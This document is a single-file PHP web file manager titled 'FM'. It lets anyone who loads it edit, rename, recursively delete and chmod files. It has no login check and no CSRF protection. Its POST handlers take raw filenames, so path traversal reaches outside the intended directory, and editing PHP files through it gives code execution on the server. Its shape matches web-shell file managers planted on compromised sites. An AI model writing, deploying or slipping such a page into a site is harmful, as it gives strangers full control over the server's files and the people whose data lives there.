<?php
session_start();
$base_dir = realpath(__DIR__);
$dir_param = isset($_GET['dir']) ? $_GET['dir'] : '';
$current_dir = realpath($base_dir . '/' . $dir_param);

if ($current_dir === false || strpos($current_dir, $base_dir) !== 0) {
    $current_dir = $base_dir;
}

$relative_dir = substr($current_dir, strlen($base_dir));
if ($relative_dir === '') $relative_dir = '/';
else $relative_dir = str_replace('\\', '/', $relative_dir);

$action = isset($_GET['a']) ? $_GET['a'] : '';
$file = isset($_GET['f']) ? $_GET['f'] : '';
$target_file = $file ? realpath($current_dir . '/' . $file) : '';

// Validate target file
if ($target_file && strpos($target_file, $base_dir) !== 0) {
    $target_file = '';
}

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $post_action = $_POST['action'] ?? '';
    
    if ($post_action === 'edit' && isset($_POST['content'])) {
        $tgt = $current_dir . '/' . $_POST['filename'];
        if (file_exists($tgt)) {
            file_put_contents($tgt, $_POST['content']);
        }
        header("Location: ?dir=" . urlencode($relative_dir));
        exit;
    }
    
    if ($post_action === 'rename' && isset($_POST['new_name'])) {
        $old = $current_dir . '/' . $_POST['old_name'];
        $new = $current_dir . '/' . $_POST['new_name'];
        if (file_exists($old)) {
            rename($old, $new);
        }
        header("Location: ?dir=" . urlencode($relative_dir));
        exit;
    }
    
    if ($post_action === 'delete') {
        $tgt = $current_dir . '/' . $_POST['filename'];
        if (file_exists($tgt)) {
            if (is_dir($tgt)) {
                rmdir_recursive($tgt);
            } else {
                unlink($tgt);
            }
        }
        header("Location: ?dir=" . urlencode($relative_dir));
        exit;
    }
    
    if ($post_action === 'chmod' && isset($_POST['mode'])) {
        $tgt = $current_dir . '/' . $_POST['filename'];
        $mode = octdec($_POST['mode']);
        if (file_exists($tgt)) {
            chmod($tgt, $mode);
        }
        header("Location: ?dir=" . urlencode($relative_dir));
        exit;
    }
}

function rmdir_recursive($dir) {
    foreach(scandir($dir) as $f) {
        if ('.' === $f || '..' === $f) continue;
        if (is_dir("$dir/$f")) rmdir_recursive("$dir/$f");
        else unlink("$dir/$f");
    }
    rmdir($dir);
}

function get_perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

$dirs = [];
$files = [];
if (is_readable($current_dir)) {
    $items = scandir($current_dir);
    foreach ($items as $item) {
        if ($item === '.') continue;
        if ($item === '..' && $current_dir === $base_dir) continue;
        $path = $current_dir . '/' . $item;
        if (is_dir($path)) $dirs[] = $item;
        else $files[] = $item;
    }
}
natcasesort($dirs);
natcasesort($files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FM</title>
<style>
  :root {
    --bg: #09090b;
    --surface: #18181b;
    --border: #27272a;
    --text: #e4e4e7;
    --text-muted: #a1a1aa;
    --accent: #a3e635; /* Lime */
    --danger: #ef4444;
    --font-ui: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    --font-mono: "JetBrains Mono", "Fira Code", "ui-monospace", monospace;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background-color: var(--bg);
    color: var(--text);
    font-family: var(--font-ui);
    font-size: 14px;
    line-height: 1.5;
    padding: 2rem 1rem;
    -webkit-font-smoothing: antialiased;
  }
  .container { max-width: 900px; margin: 0 auto; }
  
  header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding-bottom: 1rem;
    border-bottom: 1px solid var(--border);
    margin-bottom: 2rem;
  }
  .path { font-family: var(--font-mono); font-size: 0.9rem; font-weight: 500; display: flex; align-items: center; gap: 0.5rem; }
  .path a { color: var(--text-muted); text-decoration: none; transition: color 0.2s; }
  .path a:hover { color: var(--accent); }
  .path .current { color: var(--text); }
  
  .panel {
    background: var(--surface);
    border: 1px solid var(--border);
    padding: 1.5rem;
    margin-bottom: 2rem;
  }
  .panel h2 { margin-bottom: 1rem; font-size: 1rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); }
  .form-group { margin-bottom: 1rem; }
  .form-group label { display: block; margin-bottom: 0.5rem; color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase; }
  input[type="text"], textarea {
    width: 100%;
    background: var(--bg);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 0.75rem;
    font-family: var(--font-mono);
    font-size: 0.9rem;
  }
  textarea { height: 300px; resize: vertical; }
  input:focus, textarea:focus { outline: none; border-color: var(--accent); }
  
  .btn {
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 0.4rem 0.75rem;
    font-size: 0.8rem;
    cursor: pointer;
    font-family: var(--font-mono);
    text-decoration: none;
    display: inline-block;
    transition: all 0.2s;
  }
  .btn:hover { background: var(--text); color: var(--bg); border-color: var(--text); }
  .btn.danger:hover { background: var(--danger); border-color: var(--danger); color: #fff; }
  .btn-submit {
    background: var(--accent);
    color: #000;
    border: 1px solid var(--accent);
    padding: 0.75rem 1.5rem;
    font-weight: 600;
    font-family: var(--font-ui);
    font-size: 0.9rem;
  }
  .btn-submit:hover { background: transparent; color: var(--accent); }
  
  table { width: 100%; border-collapse: collapse; }
  th, td { text-align: left; padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); }
  th { color: var(--text-muted); font-weight: 500; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; }
  
  tr:hover td { background: var(--surface); }
  
  td.name { font-family: var(--font-mono); display: flex; align-items: center; gap: 0.75rem; }
  td.name a { color: var(--text); text-decoration: none; word-break: break-all; }
  td.name a:hover { color: var(--accent); }
  td.size, td.perms { font-family: var(--font-mono); color: var(--text-muted); font-size: 0.85rem; }
  
  .actions { display: flex; gap: 0.5rem; }
  
  .icon { width: 1.25rem; height: 1.25rem; flex-shrink: 0; }
  .icon-dir { stroke: var(--accent); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
  .icon-file { stroke: var(--text-muted); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

  @media (max-width: 768px) {
    th.size, td.size, th.perms, td.perms { display: none; }
    .actions { flex-wrap: wrap; }
    td.name { flex-direction: column; align-items: flex-start; gap: 0.25rem; }
    body { padding: 1rem 0.5rem; }
    .container { width: 100%; }
  }
</style>
</head>
<body>
<div class="container">
  <header>
    <div class="path">
      <svg class="icon icon-dir" viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
      <?php
      $parts = explode('/', trim($relative_dir, '/'));
      echo '<a href="?dir=">~</a>';
      $accum = '';
      foreach($parts as $p) {
        if($p === '') continue;
        $accum .= '/' . $p;
        echo ' <span style="color:var(--border)">/</span> ';
        echo '<a href="?dir='.urlencode(ltrim($accum,'/')).'">'.htmlspecialchars($p).'</a>';
      }
      ?>
    </div>
  </header>

  <?php if ($action && $target_file && file_exists($target_file)): ?>
    <?php if ($action === 'edit' && is_file($target_file)): ?>
      <div class="panel">
        <h2>Edit File: <?php echo htmlspecialchars($file); ?></h2>
        <form method="POST" action="?dir=<?php echo urlencode($relative_dir); ?>">
          <input type="hidden" name="action" value="edit">
          <input type="hidden" name="filename" value="<?php echo htmlspecialchars($file); ?>">
          <div class="form-group">
            <textarea name="content" spellcheck="false"><?php echo htmlspecialchars(file_get_contents($target_file)); ?></textarea>
          </div>
          <button type="submit" class="btn-submit">Save Changes</button>
          <a href="?dir=<?php echo urlencode($relative_dir); ?>" class="btn">Cancel</a>
        </form>
      </div>
    <?php elseif ($action === 'rename'): ?>
      <div class="panel">
        <h2>Rename: <?php echo htmlspecialchars($file); ?></h2>
        <form method="POST" action="?dir=<?php echo urlencode($relative_dir); ?>">
          <input type="hidden" name="action" value="rename">
          <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($file); ?>">
          <div class="form-group">
            <input type="text" name="new_name" value="<?php echo htmlspecialchars($file); ?>">
          </div>
          <button type="submit" class="btn-submit">Rename</button>
          <a href="?dir=<?php echo urlencode($relative_dir); ?>" class="btn">Cancel</a>
        </form>
      </div>
    <?php elseif ($action === 'chmod'): ?>
      <div class="panel">
        <h2>Chmod: <?php echo htmlspecialchars($file); ?></h2>
        <form method="POST" action="?dir=<?php echo urlencode($relative_dir); ?>">
          <input type="hidden" name="action" value="chmod">
          <input type="hidden" name="filename" value="<?php echo htmlspecialchars($file); ?>">
          <div class="form-group">
            <input type="text" name="mode" value="<?php echo substr(sprintf('%o', fileperms($target_file)), -4); ?>">
          </div>
          <button type="submit" class="btn-submit">Change Permissions</button>
          <a href="?dir=<?php echo urlencode($relative_dir); ?>" class="btn">Cancel</a>
        </form>
      </div>
    <?php endif; ?>
  <?php endif; ?>

  <table>
    <thead>
      <tr>
        <th>Name</th>
        <th class="size">Size</th>
        <th class="perms">Perms</th>
        <th>Actions</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach ($dirs as $d): 
        $dpath = $current_dir . '/' . $d;
      ?>
      <tr>
        <td class="name">
          <svg class="icon icon-dir" viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
          <a href="?dir=<?php echo urlencode(ltrim($relative_dir . '/' . $d, '/')); ?>"><?php echo htmlspecialchars($d); ?></a>
        </td>
        <td class="size">-</td>
        <td class="perms"><?php echo get_perms($dpath); ?></td>
        <td class="actions">
          <?php if($d !== '..'): ?>
          <a href="?dir=<?php echo urlencode(ltrim($relative_dir,'/')); ?>&a=rename&f=<?php echo urlencode($d); ?>" class="btn">Ren</a>
          <a href="?dir=<?php echo urlencode(ltrim($relative_dir,'/')); ?>&a=chmod&f=<?php echo urlencode($d); ?>" class="btn">Mod</a>
          <form method="POST" style="display:inline;" onsubmit="return confirm('Delete directory?');">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($d); ?>">
            <button type="submit" class="btn danger">Del</button>
          </form>
          <?php endif; ?>
        </td>
      </tr>
      <?php endforeach; ?>
      
      <?php foreach ($files as $f): 
        $fpath = $current_dir . '/' . $f;
      ?>
      <tr>
        <td class="name">
          <svg class="icon icon-file" viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline></svg>
          <?php echo htmlspecialchars($f); ?>
        </td>
        <td class="size"><?php echo format_size(filesize($fpath)); ?></td>
        <td class="perms"><?php echo get_perms($fpath); ?></td>
        <td class="actions">
          <a href="?dir=<?php echo urlencode(ltrim($relative_dir,'/')); ?>&a=edit&f=<?php echo urlencode($f); ?>" class="btn">Edit</a>
          <a href="?dir=<?php echo urlencode(ltrim($relative_dir,'/')); ?>&a=rename&f=<?php echo urlencode($f); ?>" class="btn">Ren</a>
          <a href="?dir=<?php echo urlencode(ltrim($relative_dir,'/')); ?>&a=chmod&f=<?php echo urlencode($f); ?>" class="btn">Mod</a>
          <form method="POST" style="display:inline;" onsubmit="return confirm('Delete file?');">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($f); ?>">
            <button type="submit" class="btn danger">Del</button>
          </form>
        </td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>
</div>
</body>
</html>
